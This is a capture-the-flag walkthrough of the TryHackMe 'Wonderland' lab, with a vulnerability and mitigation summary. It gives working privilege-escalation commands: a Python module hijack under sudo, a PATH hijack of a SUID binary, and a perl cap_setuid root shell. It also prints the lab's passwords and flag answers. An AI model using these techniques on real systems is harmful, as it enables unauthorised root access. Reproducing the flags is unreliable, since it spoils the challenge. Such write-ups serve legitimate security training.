# Wonderland CTF Walkthrough

**Target:** Wonderland  
**Source:** [TryHackMe](https://tryhackme.com/room/wonderland)  
**Difficulty:** Medium  
**Target IP:** 10.114.189.161

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Steganography & the Rabbit Hole](#steganography--the-rabbit-hole)
- [Hidden Credentials & Initial Foothold](#hidden-credentials--initial-foothold)
- [Lateral Movement: alice → rabbit](#lateral-movement-alice--rabbit)
- [Lateral Movement: rabbit → hatter](#lateral-movement-rabbit--hatter)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Wonderland is a medium-difficulty Linux box themed around *Alice in Wonderland*.
The objective is to read both `user.txt` and `root.txt`. The attack chain begins
with web enumeration and steganography to recover a hidden SSH credential, then
chains three lateral movements between themed users — `alice` → `rabbit` via a
`sudo` Python misconfiguration and library hijack, `rabbit` → `hatter` via a
SUID binary with an unqualified `date` call (PATH hijack), and finally a
capability-based privilege escalation through `perl` with `cap_setuid` to land
as `root`. A twist of the room places `user.txt` in `/root` and `root.txt` in
`/home/alice`.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory brute forcing and recursive path following
- Steganography extraction (`steghide`)
- Discovering credentials hidden in HTML source
- Python library/path hijacking under `sudo`
- SUID binary analysis and PATH hijacking
- Linux capabilities enumeration and abuse (`cap_setuid`)

---

## Reconnaissance

### Network Scanning

A default scan shows only two open ports:

```bash
nmap 10.114.189.161
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH |
| 80/tcp | http | HTTP |

Only SSH and a web server are exposed, so the web application is the entry
point.

---

## Web Enumeration

The landing page invites the visitor to "Follow the White Rabbit":

```bash
curl http://10.114.189.161/
```

```html
<h1>Follow the White Rabbit.</h1>
<p>"Curiouser and curiouser!" cried Alice ...</p>
<img src="/img/white_rabbit_1.jpg" ...>
```

A directory brute force reveals three directories:

```bash
gobuster dir -u http://10.114.189.161/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

```
img    (Status: 301)
poem   (Status: 301)
r      (Status: 301)
```

`/poem/` holds *The Jabberwocky*, `/r/` says "Keep Going.", and `/img/` lists
three images:

```bash
curl http://10.114.189.161/img/
```

```
alice_door.jpg
alice_door.png
white_rabbit_1.jpg
```

Three images strongly suggest steganography.

---

## Steganography & the Rabbit Hole

Trying `steghide` on each image, only `white_rabbit_1.jpg` yields data with an
empty passphrase:

```bash
steghide extract -sf white_rabbit_1.jpg
Enter passphrase:        # (blank)
wrote extracted data to "hint.txt".

cat hint.txt
follow the r a b b i t
```

The hint spells **r-a-b-b-i-t**, indicating a path to follow letter by letter.
Walking the directories recursively confirms each step responds with "Keep
Going." until the full path is built:

```bash
curl http://10.114.189.161/r/a/b/b/i/t/
```

The final page changes — it's the entrance to Wonderland.

---

## Hidden Credentials & Initial Foothold

The `/r/a/b/b/i/t/` page contains a hidden paragraph (`display: none`) in its
HTML source carrying SSH credentials:

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

> **Recovered credentials:** `alice : HowDothTheLittleCrocodileImproveHisShiningTail`

Logging in over SSH lands the first shell:

```bash
ssh alice@10.114.189.161
alice@10.114.189.161's password: HowDothTheLittleCrocodileImproveHisShiningTail

alice@wonderland:~$ whoami
alice
```

> **Foothold:** `alice`

---

## Lateral Movement: alice → rabbit

`alice`'s home contains `root.txt` (not yet readable) and a Python script.
Checking sudo rights reveals a misconfiguration:

```bash
alice@wonderland:~$ sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

`alice` can run a Python script as `rabbit`. The script imports `random`:

```python
import random
poem = """..."""
for i in range(10):
    line = random.choice(poem.split("\n"))
```

Because Python searches the current directory first when importing modules, a
malicious `random.py` placed alongside the script gets imported instead of the
standard library. Create a hijack module in `/home/alice`:

```bash
alice@wonderland:~$ nano random.py
```

```python
import os
os.system("/bin/bash")
```

Running the sudo command imports the rogue `random.py` and spawns a shell as
`rabbit`:

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit
```

> **Foothold:** `rabbit`

---

## Lateral Movement: rabbit → hatter

`rabbit`'s home holds a SUID/SGID binary owned by root:

```bash
rabbit@wonderland:/home/rabbit$ ls -l
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty

rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, ... not stripped
```

Exfiltrating the binary and inspecting its strings reveals it calls `date`
without an absolute path:

```bash
strings teaParty
...
/bin/echo -n 'Probably by ' && date --date='next hour' -R
...
```

Because `date` is invoked unqualified, a PATH hijack forces the SUID binary to
execute an attacker-controlled `date`. Plant a fake `date` that spawns a shell
and prepend the home directory to PATH:

```bash
rabbit@wonderland:/home/rabbit$ echo "/bin/bash" > date
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH

rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

The binary runs as `hatter`. The hatter's home contains a password:

```bash
hatter@wonderland:/home/rabbit$ cat ../hatter/password.txt
WhyIsARavenLikeAWritingDesk?
```

> **Recovered credentials:** `hatter : WhyIsARavenLikeAWritingDesk?`

SSH in cleanly to obtain a full `hatter` environment for the next step:

```bash
ssh hatter@10.114.189.161
hatter@10.114.189.161's password: WhyIsARavenLikeAWritingDesk?
hatter@wonderland:~$ whoami
hatter
```

> **Foothold:** `hatter`

---

## Privilege Escalation

`hatter` has no sudo rights, and the SUID hunt shows nothing unusual. The
escalation path is a Linux **capability**. Enumerating capabilities reveals
`perl` carries `cap_setuid`:

```bash
hatter@wonderland:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

`cap_setuid+ep` lets `perl` set its UID to 0, bypassing normal permission
checks. Per [GTFOBins](https://gtfobins.org/gtfobins/perl/#capabilities):

```bash
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
# whoami
root
```

> **Privilege escalation:** `hatter` → `root`

---

## Flags

The room swaps the usual flag locations — `user.txt` is in `/root`, and
`root.txt` is in `/home/alice`:

```bash
# cat /root/user.txt
thm{"Curiouser and curiouser!"}

# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you're at!}
```

| Flag | Value | Location |
|------|-------|----------|
| User flag | `thm{"Curiouser and curiouser!"}` | `/root/user.txt` |
| Root flag | `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}` | `/home/alice/root.txt` |

---

## Vulnerabilities

### 1. Credentials Hidden in HTML Source (High)

**Description:** SSH credentials for `alice` were embedded in a hidden
(`display: none`) paragraph in the page source, recoverable by anyone viewing
the HTML.

**Impact:** Initial foothold on the host as `alice`.

**Mitigation:**
- Never store credentials in client-side source, hidden or otherwise.
- Use proper authentication; do not rely on obscurity.

### 2. Sensitive Data in Steganographic Image (Low)

**Description:** A hint file was hidden inside `white_rabbit_1.jpg` and
extractable with `steghide` using a blank passphrase.

**Impact:** Information disclosure aiding the enumeration path.

**Mitigation:**
- Avoid embedding sensitive information in publicly served assets.

### 3. Insecure `sudo` Python Execution (Critical)

**Description:** `alice` could run a Python script as `rabbit` via `sudo`. The
script imported `random` without an absolute path, so a local `random.py` was
imported preferentially, executing attacker code.

**Impact:** Lateral movement from `alice` to `rabbit`.

**Mitigation:**
- Avoid granting `sudo` on scripts in user-writable directories.
- Run scripts with a controlled module search path / isolated environment.

### 4. SUID Binary with Unqualified Command (Critical)

**Description:** The root-owned SUID `teaParty` binary invoked `date` without an
absolute path, allowing a PATH hijack to run an attacker-controlled `date`.

**Impact:** Lateral movement from `rabbit` to `hatter`.

**Mitigation:**
- Call external programs with absolute paths in privileged binaries.
- Sanitize `PATH` and avoid unnecessary SUID/SGID bits.

### 5. Plaintext Password on Disk (High)

**Description:** `hatter`'s password was stored in plaintext in
`/home/hatter/password.txt`.

**Impact:** Clean SSH access as `hatter`.

**Mitigation:**
- Never store passwords in plaintext files; restrict permissions.

### 6. Dangerous Capability on perl (Critical)

**Description:** `/usr/bin/perl` carried `cap_setuid+ep`, allowing any user to
set UID 0 and spawn a root shell.

**Impact:** Full privilege escalation to `root`.

**Mitigation:**
- Remove unnecessary file capabilities (`setcap -r`).
- Audit capabilities regularly; apply least privilege.

---

## Attack Chain Summary

```
Nmap scan → 2 open ports (SSH, HTTP)
    ↓
gobuster → /img, /poem, /r
    ↓
steghide white_rabbit_1.jpg → "follow the r a b b i t"
    ↓
/r/a/b/b/i/t/ → hidden HTML → alice : HowDothTheLittleCrocodile...
    ↓
ssh alice → foothold
    ↓
sudo -l → run python as rabbit → hijack random.py → rabbit
    ↓
teaParty SUID (unqualified date) → PATH hijack → hatter
    ↓
/home/hatter/password.txt → hatter : WhyIsARavenLikeAWritingDesk?
    ↓
ssh hatter → clean shell
    ↓
getcap → perl = cap_setuid+ep → perl setuid(0) → root
    ↓
/root/user.txt + /home/alice/root.txt
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| Gobuster | Web directory enumeration |
| cURL | Inspecting pages and hidden HTML source |
| steghide | Extracting the hidden hint from an image |
| ssh | Foothold and clean lateral movement |
| python3 (random.py hijack) | alice → rabbit lateral movement |
| strings / file | Analyzing the teaParty SUID binary |
| getcap / perl | Capability enumeration and root escalation |
| GTFOBins | Reference for perl `cap_setuid` abuse |

---

## References

- [TryHackMe — Wonderland](https://tryhackme.com/room/wonderland)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [steghide](https://steghide.sourceforge.net/)
- [GTFOBins — perl (capabilities)](https://gtfobins.org/gtfobins/perl/#capabilities)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Python Module Search Path](https://docs.python.org/3/tutorial/modules.html#the-module-search-path)

---
